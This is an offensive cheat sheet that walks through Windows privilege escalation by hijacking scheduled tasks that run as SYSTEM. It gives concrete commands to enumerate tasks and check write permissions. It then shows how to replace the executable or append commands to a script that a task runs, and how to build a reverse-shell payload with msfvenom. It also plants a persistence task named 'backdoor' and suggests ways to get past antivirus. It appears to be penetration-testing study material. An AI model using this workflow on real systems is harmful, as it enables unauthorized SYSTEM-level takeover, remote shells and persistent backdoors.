# Windows Privilege Escalation – Scheduled Tasks

## Purpose

This file provides a structured workflow for identifying and exploiting scheduled tasks for privilege escalation.

Core rules:
- Tasks often run as SYSTEM or admin
- Writable task files or scripts = privilege escalation
- Execution is automatic or triggerable
- Always map task → file → permissions

---

## 0. Mental Model

Scheduled task = automated execution

If:
- task runs as SYSTEM
AND
- you control what it executes

→ SYSTEM shell

---

## 1. Enumerate Scheduled Tasks (CRITICAL FIRST STEP)

cmd:

schtasks /query /fo LIST /v

---

## 2. Key Fields to Identify

Look for:

- TaskName
- Task To Run
- Run As User
- Scheduled Task State

---

## 3. Identify High-Value Tasks

Focus on:

- Run As User: SYSTEM
- Run As User: Administrator
- custom tasks (non-Microsoft)
- tasks executing scripts or binaries

---

## 4. Extract Execution Path

Example:

Task To Run: C:\Program Files\App\backup.exe

OR:

Task To Run: C:\Scripts\backup.bat

---

## 5. Check File Permissions (CRITICAL)

icacls "C:\Scripts\backup.bat"

Look for:
- (F) Full control
- (M) Modify
- write access for Users / Everyone

---

## 6. Check Directory Permissions

icacls "C:\Scripts\"

If writable:
→ replace file

---

## 7. Exploit: Replace Executable

### Backup (optional):

copy backup.exe backup.bak

---

### Replace:

copy payload.exe backup.exe

---

## 8. Exploit: Modify Script

If script:

echo powershell -c "..." >> backup.bat

---

## 9. Generate Payload

msfvenom:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe

---

## 10. Trigger Task

### Manual trigger:

schtasks /run /tn "<TaskName>"

---

### If cannot trigger:

- wait for scheduled execution
- reboot system

---

## 11. Verify SYSTEM

whoami

Expected:

nt authority\system

---

## 12. Alternative: Create New Task

If permissions allow:

schtasks /create /sc onlogon /tn backdoor /tr "C:\payload.exe" /rl highest

---

## 13. PowerShell Enumeration

Get-ScheduledTask

---

## 14. XML Task Files

Tasks stored in:

C:\Windows\System32\Tasks\

Check:

icacls "C:\Windows\System32\Tasks\"

If writable:
→ modify task directly

---

## 15. Common Failure Points

- task runs as low-priv user
- file not writable
- directory not writable
- task not triggered
- AV blocks payload

---

## 16. If Stuck

- re-check task permissions
- check directory instead of file
- verify Run As User
- try different task

---

## 17. Quick Exploit Pattern

1. enumerate tasks
2. identify SYSTEM task
3. extract execution path
4. check permissions
5. replace or modify file
6. trigger task
7. get SYSTEM shell

---

## 18. Mental Model

Task = execution  
Writable file = control  
Trigger = shell  

---

## 19. Golden Rules

- Always check Run As User
- Always check file AND directory permissions
- Prefer script modification if available
- Trigger manually if possible
- Keep payload simple if AV present